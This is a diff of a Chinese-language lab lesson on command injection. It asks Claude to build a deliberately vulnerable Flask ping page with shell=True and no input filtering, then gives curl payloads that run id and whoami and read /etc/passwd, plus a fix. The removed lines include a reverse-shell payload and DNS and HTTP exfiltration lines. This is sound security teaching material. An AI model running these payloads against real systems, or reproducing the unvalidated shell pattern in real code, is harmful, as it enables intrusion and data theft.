@@ -1,260 +1,235 @@
 # Day 9 - 命令注入漏洞
 
-## 一、页面部署提示词
+---
 
-> 学生将此提示词发给 Claude，即可生成带命令注入漏洞的功能：
+## 一、发给 Claude 的提示词
+
+把以下内容完整复制粘贴到 claude.ai 对话框中：
 
 ```
-在 Flask 中实现网络诊断 Ping 功能，要求：
-1. 用户输入 IP 地址，服务器执行 ping 命令
-2. 把 ping 的执行结果返回给用户查看
-3. 用 subprocess 或 os.system 执行系统命令
-4. 直接拼接用户输入的 IP 到命令字符串中
-5. 为了方便查看错误，显示完整的命令执行输出
+请在上次已有的功能基础上，继续增加 Ping 网络诊断功能。保持原有功能不变。
+
+### 在 app.py 中新增以下内容：
+
+1. 新增导入：import subprocess, platform
+
+2. 新增路由 /ping，支持 GET 和 POST：
+   - 需要登录才能访问（未登录时跳转到登录页）
+   - GET 请求显示 ping 测试页面 ping.html
+   - POST 请求从表单接收 ip 参数
+   - 使用字符串拼接方式构建系统命令：f"ping -c 3 {ip}"
+   - 使用 subprocess.check_output() 执行命令，设置 shell=True
+   - 设置超时时间为 30 秒
+   - 将命令执行结果返回给用户查看
+   - 执行失败时也要返回错误输出
+
+### 新增 templates/ping.html
+
+Ping 测试页面，继承 base.html，包含：
+- IP 地址输入框
+- "Ping" 按钮
+- 黑色背景绿色文字的控制台风格输出区域
+
+### 修改 templates/base.html
+
+- 在导航栏登录后的菜单中添加"Ping测试"链接
+
+### 修改 templates/index.html
+
+- 在已登录状态下的欢迎页面中添加"Ping测试"的快捷入口
+
+### 代码规范要求
+- 使用 shell=True 执行命令
+- 使用 f-string 字符串拼接构建命令
+- 不要对 ip 参数做任何过滤或校验
+- 命令执行结果直接返回给用户
+
+生成全部代码后告诉我，我复制覆盖到本地项目中。
 ```
 
 ---
 
-## 二、漏洞关键代码解释
+## 二、学生操作步骤
 
-### 漏洞：命令注入（Command Injection）
+| 步骤 | 操作 | 说明 |
+|------|------|------|
+| 1 | 复制上面提示词发给 Claude | 增加 Ping 网络诊断功能 |
+| 2 | Claude 生成后，覆盖 app.py 和 templates | 保持原有功能不变 |
+| 3 | 终端运行 `python app.py` | 启动项目 |
+| 4 | 用 curl 测试命令注入 | 见下方 POC |
+| 5 | 分析代码，编写修复到 fix/command_runner_fix.py | 修复漏洞 |
+| 6 | `git add -A && git commit -m "day-09: Ping功能 + 命令注入修复"` | 提交成果 |
+
+---
+
+## 三、漏洞原理
+
+### 漏洞：命令注入
 
 ```python
-# core/command_runner.py
-import subprocess
-import platform
-
-def run_ping(ip_address):
-    system = platform.system().lower()
-    if 'windows' in system:
-        cmd = f"ping -n 3 {ip_address}"
-    else:
-        cmd = f"ping -c 3 {ip_address}"  # ← 用户输入拼入命令
-
-    try:
-        # ↓↓↓ 漏洞行：shell=True 允许 shell 解析特殊字符
-        result = subprocess.check_output(
-            cmd,
-            shell=True,          # 危险！启用 shell 解析
-            stderr=subprocess.STDOUT,
-            timeout=30
-        )
-        output = result.decode('utf-8', errors='replace')
-        return {"success": True, "output": output}  # 有回显！
-    except Exception as e:
-        return {"success": False, "message": f"执行失败: {str(e)}"}
+ip = request.form.get('ip')
+# 用户输入直接拼接到命令中！
+cmd = f"ping -c 3 {ip}"
+result = subprocess.check_output(cmd, shell=True, timeout=30)
 ```
 
 **问题**：
-1. **`shell=True`**：启用 shell 解释器，分号、管道符等被解析为命令分隔符
-2. **字符串拼接**：用户输入直接拼入命令，无任何过滤
-3. **有回显**：命令执行结果直接返回给用户
+- `shell=True` 启用 shell 解释器，分号、管道符被解析为命令分隔符
+- `ip` 参数未做任何过滤，直接拼接到命令字符串
 
-**关键 API 对比**：
+### Shell 注入运算符
 
-```python
-# 安全的调用方式（无 shell 介入）
-subprocess.run(["ping", "-c", "3", ip_address])
-# arg 列表形式，ip_address 作为一个独立参数传递，不会被解析
-
-# 危险的调用方式（有 shell 介入）
-subprocess.run(f"ping -c 3 {ip_address}", shell=True)
-# 字符串形式，ip_address 被 shell 解析，特殊字符会触发命令注入
-```
-
----
-
-## 三、漏洞成因总结
-
-| 漏洞 | 根本原因 | 攻击效果 |
-|------|---------|---------|
-| shell=True | 启用 shell 解释器 | 分号、管道符等可执行多条命令 |
-| 字符串拼接 | 用户输入直接拼入 | 任意系统命令执行 |
-| 有回显 | 输出返回给用户 | 看到命令执行结果 |
-| 无过滤 | 未做白名单校验 | 无限制执行任意命令 |
+| 运算符 | 作用 | 示例 |
+|--------|------|------|
+| `;` | 顺序执行 | `127.0.0.1;id` |
+| `\|` | 管道 | `127.0.0.1\|whoami` |
+| `&&` | 前命令成功才执行后命令 | `127.0.0.1&&ls` |
+| `\|\|` | 前命令失败才执行后命令 | `127.0.0.1\|\|id` |
+| `` ` ` `` | 命令替换 | `` 127.0.0.1`id` `` |
+| `$()` | 命令替换 | `127.0.0.1$(id)` |
 
 ---
 
 ## 四、POC 代码
 
-### POC 1：分号注入
+### POC 1：正常 Ping
 
 ```bash
-# 先登录
-curl http://127.0.0.1:5000/login \
-  -d "username=admin&password=admin123" \
-  -c /tmp/cookies.txt
-
-# 分号注入——执行 id 命令
-curl http://127.0.0.1:5000/ping \
-  -b /tmp/cookies.txt \
-  -d "ip=127.0.0.1;id"
+curl http://127.0.0.1:5000/ping -b /tmp/cookies.txt -d "ip=127.0.0.1"
 ```
 
-**预期结果**：输出中包含 `uid=0(root) gid=0(root)` 等 id 命令的结果。
+**预期结果**：显示 ping 命令的正常输出。
 
-### POC 2：管道符注入
+### POC 2：分号注入
 
 ```bash
-# 管道符——执行 whoami
-curl http://127.0.0.1:5000/ping \
-  -b /tmp/cookies.txt \
-  -d "ip=127.0.0.1|whoami"
-
-# 管道符——列出目录
-curl http://127.0.0.1:5000/ping \
-  -b /tmp/cookies.txt \
-  -d "ip=127.0.0.1|ls -la"
+curl http://127.0.0.1:5000/ping -b /tmp/cookies.txt -d "ip=127.0.0.1;id"
 ```
 
-### POC 3：多条命令组合
+**预期结果**：输出中包含 `uid=0(root)`，说明 id 命令被执行。
+
+### POC 3：管道符注入
 
 ```bash
+curl http://127.0.0.1:5000/ping -b /tmp/cookies.txt -d "ip=127.0.0.1|whoami"
+```
+
+**预期结果**：输出中包含 `root`。
+
+### POC 4：多条命令组合
+
+```bash
+# 列出文件
+curl http://127.0.0.1:5000/ping -b /tmp/cookies.txt -d "ip=127.0.0.1&&ls"
+
 # 读取文件
-curl http://127.0.0.1:5000/ping \
-  -b /tmp/cookies.txt \
-  -d "ip=127.0.0.1;cat /etc/passwd | head -5"
-
-# 网络探测
-curl http://127.0.0.1:5000/ping \
-  -b /tmp/cookies.txt \
-  -d "ip=127.0.0.1;curl http://your-server.com/test"
-
-# 反弹 shell（谨慎使用！）
-curl http://127.0.0.1:5000/ping \
-  -b /tmp/cookies.txt \
-  -d "ip=127.0.0.1;bash -i >& /dev/tcp/attacker/4444 0>&1"
-```
-
-### POC 4：无回显时的外带数据（Blind）
-
-如果命令没有回显（`output` 为空），可以通过 DNS 或 HTTP 外带数据：
-
-```bash
-# DNS 外带（使用 DNSLog 平台）
-curl http://127.0.0.1:5000/ping \
-  -b /tmp/cookies.txt \
-  -d "ip=127.0.0.1;nslookup \`whoami\`.your-dnslog-server.com"
-
-# HTTP 外带
-curl http://127.0.0.1:5000/ping \
-  -b /tmp/cookies.txt \
-  -d "ip=127.0.0.1;curl http://your-server.com/$(whoami)"
+curl http://127.0.0.1:5000/ping -b /tmp/cookies.txt -d "ip=127.0.0.1;cat /etc/passwd | head -5"
 ```
 
 ---
 
-## 五、POC 代码详细解释
+## 五、Burp Suite 测试方法
 
-### POC 1 详解
-
-```bash
-curl ... -d "ip=127.0.0.1;id"
-```
-
-**命令执行过程**：
-
-```bash
-# 预期执行的命令（正常）：
-ping -c 3 127.0.0.1
-# 只 ping 一个 IP
-
-# 实际执行的命令（注入后）：
-ping -c 3 127.0.0.1;id
-#            ^^^^^^^^^^^^^^
-#            shell=True 时，分号 ; 被解析为命令分隔符
-#            ping 执行完后，接着执行 id 命令
-
-# 等价于在终端中执行了：
-$ ping -c 3 127.0.0.1; id
-#                    ↑
-#              两条命令先后执行
-```
-
-**shell 注入运算符**：
-
-| 运算符 | 作用 | 示例 |
-|--------|------|------|
-| `;` | 顺序执行多条命令 | `ping 8.8.8.8;id` |
-| `\|` | 管道，前命令输出作为后命令输入 | `ping 8.8.8.8` |
-| `\|\|` | 前命令失败才执行后命令 | `ping xxx \|\| id` |
-| `&&` | 前命令成功才执行后命令 | `ping 8.8.8.8 && id` |
-| `` ` ` `` | 命令替换 | `` `id` `` |
-| `$()` | 命令替换（推荐写法） | `$(id)` |
-| `&` | 后台执行 | `ping 8.8.8.8 & id` |
-
-### Windows vs Linux 差异
-
-| 特性 | Linux | Windows |
-|------|-------|---------|
-| 命令分隔符 | `;`、`\|` | `\|`、`&` |
-| 命令替换 | `` `cmd` ``, `$(cmd)` | `%cmd%` |
-| 查看用户 | `whoami` | `whoami` |
-| 查看 IP | `ifconfig` | `ipconfig` |
-| 文件路径 | `/etc/passwd` | `C:\Windows\System32\drivers\etc\hosts` |
+1. 登录后提交 Ping 表单
+2. 在 Burp 中拦截 POST /ping 请求
+3. 发送到 Repeater
+4. 修改 ip 参数测试：
+   - `127.0.0.1;id` → 执行 id 命令
+   - `127.0.0.1|whoami` → 执行 whoami
+   - `127.0.0.1;cat /etc/passwd` → 读取文件
 
 ---
 
-## 六、修复方案
+## 六、POC 代码详细解释
+
+### 为什么 shell=True 导致命令注入？
 
 ```python
-# fix/command_runner_fix.py
+# 安全的调用方式（无 shell）
+subprocess.run(["ping", "-c", "3", "127.0.0.1;id"])
+# ping 收到的参数是：["-c", "3", "127.0.0.1;id"]
+# ping 尝试 ping 一个叫 "127.0.0.1;id" 的主机
+# 安全！
+
+# 危险的调用方式（有 shell）
+subprocess.run(f"ping -c 3 127.0.0.1;id", shell=True)
+# shell 收到的命令是：ping -c 3 127.0.0.1;id
+# shell 先执行 ping，再执行 id
+# 两条命令都执行了！
+# 危险！
+```
+
+### 攻击流程
+
+```
+用户输入: 127.0.0.1;id
+
+拼接后命令:
+  ping -c 3 127.0.0.1;id
+
+shell 解析:
+  命令1: ping -c 3 127.0.0.1
+  命令2: id
+
+输出:
+  PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
+  64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.018ms
+  ...
+  uid=0(root) gid=0(root) groups=0(root)
+```
+
+---
+
+## 七、修复方案
+
+创建 `fix/command_runner_fix.py`：
+
+```python
 import subprocess
-import re
 import ipaddress
 
+def run_ping_fixed(ip):
+    """修复：禁用 shell + IP 格式校验"""
 
-def run_ping_fixed(ip_address):
-    """修复：禁用 shell + IP 白名单 + 参数分离"""
-
-    # 修复 1：严格校验输入必须是合法 IP 地址
+    # 修复 1：校验输入必须是合法 IP 地址
     try:
-        ipaddress.ip_address(ip_address)
+        ipaddress.ip_address(ip)
     except ValueError:
-        return {"success": False, "message": "无效的 IP 地址"}
+        return "无效的 IP 地址"
 
     try:
-        # 修复 2：使用参数列表形式，禁用 shell=True
-        # 每个参数独立传入，IP 不会被 shell 解析
+        # 修复 2：使用参数列表形式，禁用 shell
         result = subprocess.check_output(
-            ["ping", "-c", "3", ip_address],   # 参数列表！
-            shell=False,                         # 禁用 shell！
+            ["ping", "-c", "3", ip],  # 参数列表
+            shell=False,               # 禁用 shell
             stderr=subprocess.STDOUT,
             timeout=30
         )
-        output = result.decode('utf-8', errors='replace')
-        return {"success": True, "output": output}
+        return result.decode('utf-8', errors='replace')
     except subprocess.TimeoutExpired:
-        return {"success": False, "message": "命令执行超时"}
+        return "命令执行超时"
     except Exception as e:
-        return {"success": False, "message": f"执行失败: {str(e)}"}
-```
-
-**为什么参数列表能防御？**
-
-```python
-# 安全的方式：参数列表
-subprocess.run(["ping", "-c", "3", "127.0.0.1;id"])
-# ping 收到的参数是: ["-c", "3", "127.0.0.1;id"]
-# ping 说：我要 ping 一个名叫 "127.0.0.1;id" 的主机
-# 分号 ; 不会被 shell 解析，只是参数的一部分
-# 根本不会有第二条命令执行！
-
-# 危险的方式：字符串 + shell
-subprocess.run("ping -c 3 127.0.0.1;id", shell=True)
-# shell 收到: "ping -c 3 127.0.0.1;id"
-# shell 说：先执行 ping，再执行 id
-# 两条命令都执行了！
+        return f"执行失败: {str(e)}"
 ```
 
 ---
 
-## 七、课后作业
+## 八、漏洞复现检查清单
 
-1. 在 `fix/` 目录创建 `command_runner_fix.py`，实现上述修复
-2. 验证：
-   - `127.0.0.1;id` → 应提示"无效的 IP 地址"或被拒绝执行
-   - `127.0.0.1` → 正常 ping
-   - IP 格式是否正确？（IPv4 和 IPv6 都应支持）
-3. 如果业务上确实需要支持域名（不只是 IP），该如何设计白名单？
-4. （进阶）如果无法禁用 `shell=True`（某些场景需要），还有哪些防御措施？
+| # | 检查项 | curl 命令 | 预期结果 |
+|---|--------|----------|---------|
+| 1 | 正常ping | `ip=127.0.0.1` | ping 正常输出 |
+| 2 | 分号注入 | `ip=127.0.0.1;id` | 显示 uid= |
+| 3 | 管道注入 | `ip=127.0.0.1\|whoami` | 显示 root |
+| 4 | 组合命令 | `ip=127.0.0.1&&ls` | 显示文件列表 |
+
+---
+
+## 九、课后任务
+
+1. 测试分号 `;`、管道符 `|`、`&&` 三种注入方式
+2. 尝试用命令注入读取 /etc/passwd
+3. 对比 shell=True 和 shell=False 的安全性差异
+4. 在 fix/ 目录下编写修复代码
+5. 验证修复后 `127.0.0.1;id` 被拒绝
+6. 提交到自己的个人分支
